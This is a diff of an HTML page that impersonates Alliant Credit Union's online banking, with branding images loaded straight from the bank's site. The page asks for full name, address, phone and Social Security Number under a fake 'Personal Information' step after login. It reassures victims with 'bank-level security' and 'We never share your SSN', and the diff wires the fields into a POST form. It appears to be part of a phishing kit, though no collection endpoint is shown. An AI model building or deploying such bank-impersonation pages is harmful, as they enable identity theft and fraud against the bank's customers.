@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Alliant – Personal information</title>
+  <title>Alliant – Personal Information</title>
   <style>
     * {
       margin: 0;
@@ -23,7 +23,6 @@
       min-height: 100vh;
     }
 
-    /* ---------- TOP SPLIT ---------- */
     .top {
       height: 100vh;
       display: flex;
@@ -49,134 +48,110 @@
 
     .logo {
       width: 230px;
-      margin-bottom: 50px;
+      margin-bottom: 40px;
     }
 
-    .secure-login {
+    .page-title {
       display: flex;
       align-items: center;
       gap: 10px;
-      font-size: 28px;
+      font-size: 26px;
       color: #333;
-      margin-bottom: 16px;
+      margin-bottom: 12px;
     }
 
-    .secure-login .lock {
-      font-size: 22px;
+    .page-title .icon {
+      font-size: 24px;
     }
 
-    .personal-sub {
+    .page-subtitle {
       font-size: 15px;
       color: #627277;
       line-height: 1.5;
-      margin-bottom: 28px;
+      margin-bottom: 30px;
       max-width: 340px;
     }
 
-    .personal-sub strong {
-      color: #333;
-      font-weight: 600;
-    }
-
-    /* ---- form fields ---- */
     .field {
       margin-bottom: 22px;
     }
 
-    .field-row {
-      display: flex;
-      justify-content: space-between;
-      align-items: baseline;
-      margin-bottom: 8px;
-    }
-
-    .field-row label {
+    .field label {
+      display: block;
       font-size: 15px;
       color: #333;
-      font-weight: 500;
-    }
-
-    .field-row a {
-      font-size: 13px;
-      color: #2b7a9e;
-      text-decoration: none;
-    }
-
-    .input-wrap {
-      position: relative;
+      margin-bottom: 6px;
     }
 
     .field input {
       width: 100%;
-      padding: 10px 14px;
+      padding: 9px 14px;
       font-size: 15px;
       border: 1px solid #ccc;
       border-radius: 6px;
       outline: none;
       transition: border 0.15s, box-shadow 0.15s;
-      background: #fff;
-      color: #333;
     }
 
     .field input:focus {
       border-color: #7fb3e0;
-      box-shadow: 0 0 0 3px rgba(123, 164, 40, 0.1);
+      box-shadow: 0 0 0 2px rgba(123, 164, 40, 0.1);
     }
 
     .field input::placeholder {
       color: #aaa;
-      font-size: 14px;
     }
 
-    /* two-column row */
-    .field-split {
-      display: flex;
-      gap: 16px;
-      margin-bottom: 22px;
-    }
-
-    .field-split .field {
-      flex: 1;
-      margin-bottom: 0;
-    }
-
-    /* three-column row */
-    .field-split-3 {
+    /* inline row for city, state, zip */
+    .field-row-3 {
       display: flex;
       gap: 12px;
-      margin-bottom: 22px;
     }
 
-    .field-split-3 .field {
+    .field-row-3 .field {
       flex: 1;
       margin-bottom: 0;
     }
 
-    /* small icons inside inputs */
-    .input-wrap .input-icon {
-      position: absolute;
-      right: 14px;
-      top: 50%;
-      transform: translateY(-50%);
-      color: #999;
-      font-size: 15px;
-      pointer-events: none;
+    .field-row-3 .field.state {
+      flex: 0 0 80px;
     }
 
-    .input-wrap .cvv-hint {
-      position: absolute;
-      right: 14px;
-      top: 50%;
-      transform: translateY(-50%);
-      color: #2b7a9e;
+    .field-row-3 .field.zip {
+      flex: 0 0 110px;
+    }
+
+    .ssn-wrap {
+      position: relative;
+    }
+
+    .ssn-hint {
       font-size: 12px;
-      font-weight: 500;
-      cursor: help;
-      pointer-events: auto;
+      color: #627277;
+      margin-top: 4px;
+      display: block;
     }
 
-    /* ---- primary button ---- */
-    .primary-btn {
+    .privacy-note {
+      display: flex;
+      align-items: flex-start;
+      gap: 8px;
+      font-size: 13px;
+      color: #627277;
+      line-height: 1.4;
+      margin: 26px 0 30px;
+      padding: 10px 12px;
+      background: #f7f9fa;
+      border-radius: 6px;
+    }
+
+    .privacy-note .lock-small {
+      flex-shrink: 0;
+      margin-top: 1px;
+      color: #7ba428;
+    }
+
+    .continue-btn {
       background: #7ba428;
       color: #fff;
       border: none;
@@ -184,51 +159,24 @@
       padding: 12px 75px;
       font-size: 18px;
       cursor: pointer;
-      margin-bottom: 20px;
+      margin-bottom: 30px;
       width: auto;
       align-self: flex-start;
       transition: background 0.2s;
     }
 
-    .primary-btn:hover {
+    .continue-btn:hover {
       background: #6b9122;
     }
 
-    .primary-btn:disabled {
-      background: #b5cc85;
-      cursor: not-allowed;
-    }
-
-    /* ---- back link ---- */
     .back-link {
       font-size: 15px;
-      color: #627277;
-    }
-
-    .back-link a {
       color: #2b7a9e;
       text-decoration: none;
-      margin-left: 4px;
-      font-weight: 500;
     }
 
-    .back-link a:hover {
+    .back-link:hover {
       text-decoration: underline;
-    }
-
-    /* security note */
-    .security-note {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      font-size: 12px;
-      color: #888;
-      margin-top: 16px;
-      max-width: 340px;
-    }
-
-    .security-note svg {
-      flex-shrink: 0;
     }
 
     /* RIGHT PANEL – blue presentation */
@@ -247,7 +195,7 @@
       filter: drop-shadow(0 8px 16px rgba(0, 0, 0, 0.08));
     }
 
-    /* ---------- FOOTER ---------- */
+    /* BOTTOM FOOTER */
     .bottom {
       background: #ffffff;
       border-top: 1px solid #ddd;
@@ -313,7 +261,7 @@
       color: #627277;
     }
 
-    /* ---------- MOBILE ---------- */
+    /* Mobile */
     @media (max-width: 768px) {
       .top {
         height: auto;
@@ -338,47 +286,49 @@
 
       .logo {
         width: 250px;
-        margin: 20px auto 50px;
-        margin-bottom: 100px;
+        margin: 20px auto 40px;
       }
 
-      .secure-login {
+      .page-title {
         justify-content: center;
-        font-size: 24px;
+        font-size: 22px;
       }
 
-      .personal-sub {
+      .page-subtitle {
         text-align: center;
         max-width: 100%;
       }
 
-      .field-row {
+      .field {
         text-align: left;
       }
 
-      .primary-btn {
-        margin-top: 20px;
-        width: 60%;
-        font-size: 16px;
+      .field-row-3 {
+        flex-direction: column;
+        gap: 22px;
+      }
+
+      .field-row-3 .field,
+      .field-row-3 .field.state,
+      .field-row-3 .field.zip {
+        flex: 1;
+      }
+
+      .privacy-note {
+        text-align: left;
+      }
+
+      .continue-btn {
+        width: 80%;
         align-self: center;
         text-align: center;
         padding: 12px 20px;
-        white-space: nowrap;
       }
 
       .back-link {
+        display: block;
         text-align: center;
-      }
-
-      .security-note {
-        justify-content: center;
-        text-align: left;
-      }
-
-      .field-split,
-      .field-split-3 {
-        flex-direction: column;
-        gap: 22px;
+        margin-top: 10px;
       }
 
       .bottom {
@@ -411,118 +361,81 @@
 <body>
   <div class="container">
     <div class="top">
-      <!-- LEFT: personal information form -->
+      <!-- left side: personal information form -->
       <div class="left">
         <img class="logo" src="https://www.alliantcreditunion.com/OnlineBanking/Content/alliant-logo.svg" alt="Alliant">
 
-        <div class="secure-login">
-          <svg class="lock" viewBox="0 0 24 24" width="22" height="22" fill="#222" aria-hidden="true">
-            <path d="M12 1a5 5 0 0 0-5 5v3H6a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-9a2 2 0 0 0-2-2h-1V6a5 5 0 0 0-5-5zm3 8H9V6a3 3 0 0 1 6 0v3z"/>
-          </svg>
-          <span>Personal information</span>
+        <div class="page-title">
+          <span class="icon">👤</span>
+          <span>Personal Information</span>
         </div>
 
-        <p class="personal-sub">
-          Please provide your <strong>personal details</strong> to continue. All fields are required.
-        </p>
+        <p class="page-subtitle">Please provide your details so we can set up your online banking profile.</p>
 
-        <!-- Full name -->
-        <div class="field">
-          <div class="field-row">
-            <label for="fullName">Full name</label>
+        <!-- Form posts to "#" -->
+        <form action="#" method="post">
+          <!-- Full name -->
+          <div class="field">
+            <label for="fullname">Full Name</label>
+            <input type="text" id="fullname" name="fullname" placeholder="e.g., Jane A. Doe" autocomplete="name" required>
           </div>
-          <div class="input-wrap">
-            <input type="text" id="fullName" name="fullName" placeholder="e.g. Jane M. Doe" autocomplete="name">
-          </div>
-        </div>
 
-        <!-- Street address -->
-        <div class="field">
-          <div class="field-row">
-            <label for="address">Street address</label>
+          <!-- Street address -->
+          <div class="field">
+            <label for="street">Street Address</label>
+            <input type="text" id="street" name="street" placeholder="123 Main Street, Apt 4B" autocomplete="street-address" required>
           </div>
-          <div class="input-wrap">
-            <input type="text" id="address" name="address" placeholder="e.g. 123 Main St, Apt 4B" autocomplete="street-address">
-          </div>
-        </div>
 
-        <!-- City, State, ZIP -->
-        <div class="field-split-3">
-          <div class="field" style="flex: 2;">
-            <div class="field-row">
+          <!-- City / State / ZIP -->
+          <div class="field-row-3">
+            <div class="field">
               <label for="city">City</label>
+              <input type="text" id="city" name="city" placeholder="Chicago" autocomplete="address-level2" required>
             </div>
-            <div class="input-wrap">
-              <input type="text" id="city" name="city" placeholder="City" autocomplete="address-level2">
-            </div>
-          </div>
-          <div class="field" style="flex: 1;">
-            <div class="field-row">
+            <div class="field state">
               <label for="state">State</label>
+              <input type="text" id="state" name="state" placeholder="IL" maxlength="2" autocomplete="address-level1" required>
             </div>
-            <div class="input-wrap">
-              <input type="text" id="state" name="state" placeholder="State" maxlength="2" autocomplete="address-level1">
-            </div>
-          </div>
-          <div class="field" style="flex: 1;">
-            <div class="field-row">
+            <div class="field zip">
               <label for="zip">ZIP</label>
-            </div>
-            <div class="input-wrap">
-              <input type="text" id="zip" name="zip" inputmode="numeric" placeholder="ZIP" maxlength="5" autocomplete="postal-code">
+              <input type="text" id="zip" name="zip" placeholder="60601" maxlength="5" inputmode="numeric" autocomplete="postal-code" required>
             </div>
           </div>
-        </div>
 
-        <!-- Phone number -->
-        <div class="field">
-          <div class="field-row">
-            <label for="phone">Phone number</label>
+          <!-- Phone number -->
+          <div class="field">
+            <label for="phone">Phone Number</label>
+            <input type="tel" id="phone" name="phone" placeholder="(312) 555-0199" autocomplete="tel" required>
           </div>
-          <div class="input-wrap">
-            <input type="text" id="phone" name="phone" inputmode="tel" placeholder="(555) 123-4567" maxlength="14" autocomplete="tel">
-            <span class="input-icon">
-              <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="#999" stroke-width="2" aria-hidden="true">
-                <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0 1 22 16.92z"/>
-              </svg>
-            </span>
+
+          <!-- Social Security Number -->
+          <div class="field">
+            <label for="ssn">Social Security Number (SSN)</label>
+            <div class="ssn-wrap">
+              <input type="text" id="ssn" name="ssn" placeholder="XXX-XX-XXXX" maxlength="11" inputmode="numeric" autocomplete="off" required>
+            </div>
+            <span class="ssn-hint">Required for identity verification. We never share your SSN.</span>
           </div>
-        </div>
 
-        <!-- SSN -->
-        <div class="field">
-          <div class="field-row">
-            <label for="ssn">Social Security Number</label>
-            <a href="#" title="We need your SSN to verify your identity.">Why?</a>
+          <!-- privacy note -->
+          <div class="privacy-note">
+            <span class="lock-small">🔒</span>
+            <span>Your information is encrypted and protected with bank‑level security.</span>
           </div>
-          <div class="input-wrap">
-            <input type="text" id="ssn" name="ssn" inputmode="numeric" placeholder="XXX-XX-XXXX" maxlength="11" autocomplete="off">
-            <span class="cvv-hint" title="9-digit SSN, formatted XXX-XX-XXXX">?</span>
-          </div>
-        </div>
 
-        <button class="primary-btn" id="continueBtn">Continue</button>
-
-        <div class="back-link">
-          <a href="#" onclick="history.back(); return false;">← Back</a>
-        </div>
-
-        <div class="security-note">
-          <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="#888" stroke-width="2" aria-hidden="true">
-            <rect x="4" y="11" width="16" height="10" rx="2"/>
-            <path d="M8 11V7a4 4 0 0 1 8 0v4"/>
-          </svg>
-          <span>Your personal information is encrypted and secure.</span>
-        </div>
+          <!-- Button submits form to "#" via POST -->
+          <button type="submit" class="continue-btn">Continue</button>
+          <a href="#" class="back-link">← Back to login</a>
+        </form>
       </div>
 
-      <!-- RIGHT: blue panel -->
+      <!-- right blue area -->
       <div class="right">
         <img src="https://www.alliantcreditunion.com/OnlineBanking/Content/login-presentation.png" alt="">
       </div>
     </div>
 
-    <!-- FOOTER -->
+    <!-- footer -->
     <div class="bottom">
       <div class="badges">
         <img class="badge-housing" src="https://www.alliantcreditunion.com/OnlineBanking/design/equal-housing-opportunity.png" alt="Equal Housing Opportunity">
@@ -547,110 +460,5 @@
       </div>
     </div>
   </div>
-
-  <script>
-    (function() {
-      const fullNameInput = document.getElementById('fullName');
-      const addressInput = document.getElementById('address');
-      const cityInput = document.getElementById('city');
-      const stateInput = document.getElementById('state');
-      const zipInput = document.getElementById('zip');
-      const phoneInput = document.getElementById('phone');
-      const ssnInput = document.getElementById('ssn');
-      const continueBtn = document.getElementById('continueBtn');
-
-      // --- Phone: auto-format (XXX) XXX-XXXX ---
-      phoneInput.addEventListener('input', (e) => {
-        let value = e.target.value.replace(/\D/g, '').slice(0, 10);
-        if (value.length >= 6) {
-          e.target.value = '(' + value.slice(0, 3) + ') ' + value.slice(3, 6) + '-' + value.slice(6);
-        } else if (value.length >= 4) {
-          e.target.value = '(' + value.slice(0, 3) + ') ' + value.slice(3);
-        } else if (value.length >= 1) {
-          e.target.value = '(' + value;
-        } else {
-          e.target.value = '';
-        }
-      });
-
-      // --- SSN: auto-format XXX-XX-XXXX ---
-      ssnInput.addEventListener('input', (e) => {
-        let value = e.target.value.replace(/\D/g, '').slice(0, 9);
-        if (value.length > 5) {
-          e.target.value = value.slice(0, 3) + '-' + value.slice(3, 5) + '-' + value.slice(5);
-        } else if (value.length > 3) {
-          e.target.value = value.slice(0, 3) + '-' + value.slice(3);
-        } else {
-          e.target.value = value;
-        }
-      });
-
-      // --- ZIP: digits only ---
-      zipInput.addEventListener('input', (e) => {
-        e.target.value = e.target.value.replace(/\D/g, '').slice(0, 5);
-      });
-
-      // --- State: uppercase letters only ---
-      stateInput.addEventListener('input', (e) => {
-        e.target.value = e.target.value.replace(/[^a-zA-Z]/g, '').toUpperCase().slice(0, 2);
-      });
-
-      // --- Continue: validate required fields ---
-      continueBtn.addEventListener('click', () => {
-        const fields = [fullNameInput, addressInput, cityInput, stateInput, zipInput, phoneInput, ssnInput];
-        fields.forEach(inp => inp.style.borderColor = '#ccc');
-
-        let valid = true;
-
-        if (!fullNameInput.value.trim()) {
-          fullNameInput.style.borderColor = '#c0392b';
-          valid = false;
-        }
-        if (!addressInput.value.trim()) {
-          addressInput.style.borderColor = '#c0392b';
-          valid = false;
-        }
-        if (!cityInput.value.trim()) {
-          cityInput.style.borderColor = '#c0392b';
-          valid = false;
-        }
-        if (!stateInput.value.trim() || stateInput.value.length !== 2) {
-          stateInput.style.borderColor = '#c0392b';
-          valid = false;
-        }
-        if (!zipInput.value.trim() || zipInput.value.length !== 5) {
-          zipInput.style.borderColor = '#c0392b';
-          valid = false;
-        }
-        if (!phoneInput.value.trim() || phoneInput.value.replace(/\D/g, '').length !== 10) {
-          phoneInput.style.borderColor = '#c0392b';
-          valid = false;
-        }
-        if (!ssnInput.value.trim() || ssnInput.value.replace(/\D/g, '').length !== 9) {
-          ssnInput.style.borderColor = '#c0392b';
-          valid = false;
-        }
-
-        if (!valid) {
-          alert('Please fill in all personal information fields correctly.');
-          return;
-        }
-
-        continueBtn.textContent = 'Processing…';
-        continueBtn.disabled = true;
-        setTimeout(() => {
-          continueBtn.textContent = 'Continue';
-          continueBtn.disabled = false;
-        }, 800);
-      });
-
-      // reset red borders on input
-      [fullNameInput, addressInput, cityInput, stateInput, zipInput, phoneInput, ssnInput].forEach(inp => {
-        inp.addEventListener('input', () => {
-          inp.style.borderColor = '#ccc';
-        });
-      });
-    })();
-  </script>
 </body>
 </html>
